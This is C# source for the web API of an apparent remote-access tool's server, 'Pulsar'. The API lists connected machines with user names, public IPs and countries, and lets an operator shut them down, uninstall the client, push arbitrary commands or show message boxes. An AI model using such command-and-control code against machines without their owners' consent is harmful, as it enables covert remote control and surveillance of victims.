#if NET48
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.QuickCommands;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Server.Persistence;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Networking.WebApi
{
    /// <summary>
    /// REST API + live event stream + dashboard, hosted with Kestrel inside the server process.
    /// Every /api request must carry the configured API key in the 'X-Api-Key' header.
    /// The dashboard shell (GET /) is served without auth but contains no data — every fetch it makes requires the key.
    /// Enabled/configured in Settings (see FrmSettings); started/stopped by FrmMain.
    /// </summary>
    public sealed class WebApiServer : IDisposable
    {
        private const int LogBufferSize = 200;
        private const int SseHeartbeatMs = 15000;

        private readonly Func<Client[]> _getClients;
        private readonly Action<string, string> _log;
        private readonly string _autoTasksFilePath;
        private WebApplication _app;
        private Task _runTask;

        // SSE hub
        private readonly object _sseLock = new object();
        private readonly List<SseSubscriber> _sseSubscribers = new List<SseSubscriber>();
        private Timer _sseHeartbeat;

        // server event-log ring buffer (fed by FrmMain.EventLog tap)
        private readonly object _logBufferLock = new object();
        private readonly Queue<LogEntry> _logBuffer = new Queue<LogEntry>();

        private sealed class SseSubscriber
        {
            public HttpContext Context;
            public SemaphoreSlim WriteLock = new SemaphoreSlim(1, 1);
        }

        private sealed class LogEntry
        {
            public string Time;
            public string Level;
            public string Message;
        }

        public bool Running { get; private set; }

        public WebApiServer(Func<Client[]> getClients, Action<string, string> log, string autoTasksFilePath = null)
        {
            _getClients = getClients ?? throw new ArgumentNullException(nameof(getClients));
            _log = log;
            _autoTasksFilePath = autoTasksFilePath;
        }

        /// <summary>
        /// Starts the API on the given port. Refuses to start without an API key —
        /// an unauthenticated endpoint into the clients would be worse than no endpoint.
        /// </summary>
        public bool Start(ushort port, string apiKey)
        {
            if (Running)
                return true;

            if (string.IsNullOrWhiteSpace(apiKey))
            {
                _log?.Invoke("Web API not started: no API key configured (Settings → Web API).", "error");
                return false;
            }

            try
            {
                var builder = WebApplication.CreateBuilder(new WebApplicationOptions
                {
                    ApplicationName = "Pulsar.WebApi",
                    Args = Array.Empty<string>()
                });
                builder.Logging.ClearProviders();
                builder.WebHost.ConfigureKestrel(options => options.ListenAnyIP(port));

                var app = builder.Build();
                Configure(app, apiKey);
                _runTask = app.RunAsync();

                _app = app;
                _sseHeartbeat = new Timer(SendHeartbeat, null, SseHeartbeatMs, SseHeartbeatMs);
                Running = true;
                Log($"Web API listening on port {port} (auth: X-Api-Key header required; dashboard at /).", "normal");
                return true;
            }
            catch (Exception ex)
            {
                _log?.Invoke($"Web API failed to start on port {port}: {ex.Message}", "error");
                _app = null;
                Running = false;
                return false;
            }
        }

        private void Configure(WebApplication app, string apiKey)
        {
            // constant-time key comparison over SHA-256 digests (also hides the key length)
            byte[] expected = SHA256.HashData(Encoding.UTF8.GetBytes(apiKey));

            app.Use(async (ctx, next) =>
            {
                string path = ctx.Request.Path.HasValue ? ctx.Request.Path.Value : string.Empty;
                bool isShell = path == "/" || path == "/dashboard" || path == "/favicon.ico";
                if (!isShell)
                {
                    string provided = ctx.Request.Headers["X-Api-Key"].ToString();
                    if (string.IsNullOrEmpty(provided) ||
                        !CryptographicOperations.FixedTimeEquals(
                            SHA256.HashData(Encoding.UTF8.GetBytes(provided)), expected))
                    {
                        ctx.Response.StatusCode = StatusCodes.Status401Unauthorized;
                        await ctx.Response.WriteAsync("invalid or missing X-Api-Key header");
                        return;
                    }
                }

                await next();
            });

            // dashboard shell (no embedded data; every fetch it performs needs the key)
            string dashboardHtml = LoadDashboardHtml();
            app.MapGet("/", () => Results.Text(dashboardHtml, "text/html", Encoding.UTF8));
            app.MapGet("/dashboard", () => Results.Text(dashboardHtml, "text/html", Encoding.UTF8));
            app.MapGet("/favicon.ico", () => Results.StatusCode(StatusCodes.Status204NoContent));

            app.MapGet("/api/version", () =>
                Results.Json(new { version = ServerVersion.Display, api = 2 }));

            app.MapGet("/api/stats", () =>
                Results.Json(new
                {
                    connected = GetClients().Length,
                    version = ServerVersion.Display
                }));

            app.MapGet("/api/clients", () =>
                Results.Json(GetClients().Select(ProjectClient).ToArray()));

            app.MapGet("/api/clients/{id}", (string id) =>
            {
                var client = FindClient(id);
                return client == null
                    ? NotFound()
                    : Results.Json(ProjectClient(client));
            });

            // previously seen clients (SQLite repository), online flag included
            app.MapGet("/api/knownclients", () =>
            {
                try
                {
                    var all = OfflineClientRepository.GetAllClients();
                    return Results.Json(all.Select(r => new
                    {
                        id = r.ClientId,
                        userAtPc = r.UserAtPc,
                        username = r.Username,
                        pcName = r.PcName,
                        publicIp = r.PublicIP,
                        tag = r.Tag,
                        country = r.Country,
                        countryCode = r.CountryCode,
                        operatingSystem = r.OperatingSystem,
                        version = r.Version,
                        accountType = r.AccountType,
                        online = r.IsOnline,
                        firstSeenUtc = r.FirstSeenUtc,
                        lastSeenUtc = r.LastSeenUtc
                    }).ToArray());
                }
                catch
                {
                    return Results.Json(new object[] { });
                }
            });

            app.MapGet("/api/offline", () =>
            {
                try
                {
                    var offline = OfflineClientRepository.GetClientsByOnlineState(false);
                    return Results.Json(offline.Select(r => new
                    {
                        id = r.ClientId,
                        userAtPc = r.UserAtPc,
                        tag = r.Tag,
                        publicIp = r.PublicIP,
                        country = r.Country,
                        operatingSystem = r.OperatingSystem,
                        version = r.Version,
                        lastSeenUtc = r.LastSeenUtc
                    }).ToArray());
                }
                catch
                {
                    return Results.Json(new object[] { });
                }
            });

            app.MapGet("/api/autotasks", () => ReadAutoTasks());

            // recent server event-log entries (ring buffer fed by FrmMain.EventLog)
            app.MapGet("/api/log", (HttpContext ctx) =>
            {
                int limit = 200;
                string q = ctx.Request.Query["limit"].ToString();
                if (int.TryParse(q, out int parsed) && parsed > 0)
                    limit = Math.Min(parsed, LogBufferSize);

                LogEntry[] snapshot;
                lock (_logBufferLock)
                {
                    snapshot = _logBuffer.Skip(Math.Max(0, _logBuffer.Count - limit)).ToArray();
                }

                return Results.Json(snapshot.Select(e => new { time = e.Time, level = e.Level, message = e.Message }));
            });

            // live event stream (SSE): client connect/disconnect + server log lines + heartbeat
            app.MapGet("/api/events", async (HttpContext ctx) =>
            {
                ctx.Response.StatusCode = StatusCodes.Status200OK;
                ctx.Response.ContentType = "text/event-stream";
                ctx.Response.Headers.CacheControl = "no-cache";
                ctx.Response.Headers.Connection = "keep-alive";

                var subscriber = new SseSubscriber { Context = ctx };
                lock (_sseLock)
                {
                    _sseSubscribers.Add(subscriber);
                }

                try
                {
                    await WriteSseData(subscriber, JsonSerializer.Serialize(new
                    {
                        type = "hello",
                        timestampUtc = DateTime.UtcNow,
                        data = new { connected = GetClients().Length }
                    }));
                    await WriteSseRaw(subscriber, "retry: 5000\n\n");

                    await Task.Delay(Timeout.Infinite, ctx.RequestAborted);
                }
                catch (OperationCanceledException)
                {
                    // client went away
                }
                catch (Exception ex)
                {
                    Log($"SSE subscriber dropped: {ex.Message}", "info");
                }
                finally
                {
                    lock (_sseLock)
                    {
                        _sseSubscribers.Remove(subscriber);
                    }
                }
            });

            MapClientAction(app, "/api/clients/{id}/shutdown",
                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown }));
            MapClientAction(app, "/api/clients/{id}/restart",
                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Restart }));
            MapClientAction(app, "/api/clients/{id}/standby",
                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Standby }));
            MapClientAction(app, "/api/clients/{id}/lockscreen",
                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Lockscreen }));
            MapClientAction(app, "/api/clients/{id}/reconnect", c => c.Send(new DoClientReconnect()));
            MapClientAction(app, "/api/clients/{id}/disconnect", c => c.Send(new DoClientDisconnect()));
            MapClientAction(app, "/api/clients/{id}/uninstall", c => c.Send(new DoClientUninstall()));

            app.MapPost("/api/clients/{id}/quickcommand", (string id, QuickCommandRequest body) =>
            {
                if (string.IsNullOrWhiteSpace(body?.Command))
                    return Results.Json(new { error = "command is required" }, statusCode: 400);

                var client = FindClient(id);
                if (client == null)
                    return NotFound();

                client.Send(new DoSendQuickCommand { Command = body.Command, Host = body.Host });
                Log($"[Web API] Quick command sent to {client.Value?.UserAtPc}", "normal");
                return Results.Json(new { sent = true });
            });

            app.MapPost("/api/clients/{id}/messagebox", (string id, MessageBoxRequest body) =>
            {
                if (string.IsNullOrWhiteSpace(body?.Text))
                    return Results.Json(new { error = "text is required" }, statusCode: 400);

                var client = FindClient(id);
                if (client == null)
                    return NotFound();

                client.Send(new DoShowMessageBox
                {
                    Caption = body.Caption,
                    Text = body.Text,
                    Button = string.IsNullOrEmpty(body.Button) ? "OK" : body.Button,
                    Icon = string.IsNullOrEmpty(body.Icon) ? "Information" : body.Icon
                });
                Log($"[Web API] Message box sent to {client.Value?.UserAtPc}", "normal");
                return Results.Json(new { sent = true });
            });
        }

        #region Events + log tap (called by FrmMain)

        /// <summary>
        /// Tap for FrmMain.EventLog — buffers the entry and streams it to SSE subscribers.
        /// </summary>
        public void PublishLog(string message, string level)
        {
            if (string.IsNullOrEmpty(message))
                return;

            var entry = new LogEntry
            {
                Time = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"),
                Level = level,
                Message = message
            };

            lock (_logBufferLock)
            {
                _logBuffer.Enqueue(entry);
                while (_logBuffer.Count > LogBufferSize)
                    _logBuffer.Dequeue();
            }

            PublishEvent("log", new { level = entry.Level, message = entry.Message });
        }

        /// <summary>
        /// Tap for FrmMain.ClientConnected/ClientDisconnected — streams the event to SSE subscribers.
        /// </summary>
        public void PublishClientEvent(bool connected, Client client)
        {
            if (client == null)
                return;

            PublishEvent(connected ? "client_connected" : "client_disconnected",
                ProjectClient(client));
        }

        private void PublishEvent(string type, object data)
        {
            string payload = JsonSerializer.Serialize(new
            {
                type,
                timestampUtc = DateTime.UtcNow,
                data
            });

            SseSubscriber[] snapshot;
            lock (_sseLock)
            {
                snapshot = _sseSubscribers.ToArray();
            }

            foreach (var subscriber in snapshot)
            {
                _ = WriteSseData(subscriber, payload); // fire & forget; failures unsubscribe on next heartbeat
            }
        }

        #endregion

        #region SSE plumbing

        private static async Task WriteSseRaw(SseSubscriber subscriber, string raw)
        {
            await subscriber.WriteLock.WaitAsync();
            try
            {
                await subscriber.Context.Response.WriteAsync(raw);
            }
            finally
            {
                subscriber.WriteLock.Release();
            }
        }

        private static Task WriteSseData(SseSubscriber subscriber, string json)
        {
            return WriteSseRaw(subscriber, "data: " + json + "\n\n");
        }

        private void SendHeartbeat(object state)
        {
            SseSubscriber[] snapshot;
            lock (_sseLock)
            {
                snapshot = _sseSubscribers.ToArray();
            }

            foreach (var subscriber in snapshot)
            {
                Task.Run(async () =>
                {
                    try
                    {
                        await WriteSseRaw(subscriber, ": keepalive\n\n");
                    }
                    catch
                    {
                        // dead subscriber; force-disconnect so the /api/events loop unregisters it
                        try { subscriber.Context.Abort(); } catch { }
                        lock (_sseLock) { _sseSubscribers.Remove(subscriber); }
                    }
                }).Forget();
            }
        }

        #endregion

        #region Helpers

        private void Log(string message, string level)
        {
            _log?.Invoke(message, level);
            PublishLog(message, level);
        }

        private static string LoadDashboardHtml()
        {
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                string name = assembly.GetManifestResourceNames()
                    .FirstOrDefault(n => n.EndsWith(".Dashboard.html", StringComparison.OrdinalIgnoreCase));
                if (name == null)
                    return "<html><body>Pulsar Web API - dashboard resource missing. Use the REST endpoints under /api.</body></html>";

                using var stream = assembly.GetManifestResourceStream(name);
                using var reader = new StreamReader(stream, Encoding.UTF8);
                return reader.ReadToEnd();
            }
            catch
            {
                return "<html><body>Pulsar Web API - dashboard resource missing. Use the REST endpoints under /api.</body></html>";
            }
        }

        private object ReadAutoTasks()
        {
            try
            {
                if (string.IsNullOrEmpty(_autoTasksFilePath) || !File.Exists(_autoTasksFilePath))
                    return Results.Json(new object[] { });

                string json = File.ReadAllText(_autoTasksFilePath);
                var tasks = Newtonsoft.Json.JsonConvert.DeserializeObject<List<Forms.AutoTask>>(json);
                return Results.Json((tasks ?? new List<Forms.AutoTask>()).Select(t => new
                {
                    title = t.Title,
                    identifier = t.Identifier,
                    executionMode = t.ExecutionMode.ToString(),
                    param1 = t.Param1,
                    param2 = t.Param2,
                    param3 = t.Param3,
                    param4 = t.Param4
                }).ToArray());
            }
            catch (Exception ex)
            {
                return Results.Json(new { error = ex.Message }, statusCode: 500);
            }
        }

        private void MapClientAction(WebApplication app, string pattern, Action<Client> send)
        {
            app.MapPost(pattern, (string id) =>
            {
                var client = FindClient(id);
                if (client == null)
                    return NotFound();

                send(client);
                return Results.Json(new { sent = true });
            });
        }

        private Client[] GetClients()
        {
            return _getClients() ?? Array.Empty<Client>();
        }

        private Client FindClient(string id)
        {
            return GetClients().FirstOrDefault(c =>
                string.Equals(c.Value?.Id, id, StringComparison.OrdinalIgnoreCase));
        }

        private static IResult NotFound() => Results.Json(new { error = "client not found" }, statusCode: 404);

        private static object ProjectClient(Client c) => new
        {
            id = c.Value?.Id,
            userAtPc = c.Value?.UserAtPc,
            username = c.Value?.Username,
            pcName = c.Value?.PcName,
            publicIp = c.Value?.PublicIP,
            country = c.Value?.Country,
            countryCode = c.Value?.CountryCode,
            tag = c.Value?.Tag,
            operatingSystem = c.Value?.OperatingSystem,
            version = c.Value?.Version,
            accountType = c.Value?.AccountType,
            endPoint = c.EndPoint?.ToString(),
            connected = c.Connected
        };

        #endregion

        public sealed record QuickCommandRequest(string Command, string Host);

        public sealed record MessageBoxRequest(string Caption, string Text, string Button, string Icon);

        public void Dispose()
        {
            _sseHeartbeat?.Dispose();
            _sseHeartbeat = null;

            SseSubscriber[] snapshot;
            lock (_sseLock)
            {
                snapshot = _sseSubscribers.ToArray();
                _sseSubscribers.Clear();
            }
            foreach (var subscriber in snapshot)
            {
                try { subscriber.Context.Abort(); } catch { }
            }

            if (_app == null) return;

            try { _app.StopAsync().GetAwaiter().GetResult(); } catch { }
            try { _app.DisposeAsync().AsTask().GetAwaiter().GetResult(); } catch { }
            try { _runTask?.GetAwaiter().GetResult(); } catch { }

            _app = null;
            _runTask = null;
            Running = false;
        }
    }

    internal static class TaskExtensions
    {
        // explicitly ignore an unobserved fire-and-forget task
        internal static void Forget(this Task task)
        {
            _ = task.ContinueWith(t => { }, TaskContinuationOptions.OnlyOnFaulted);
        }
    }
}
#endif
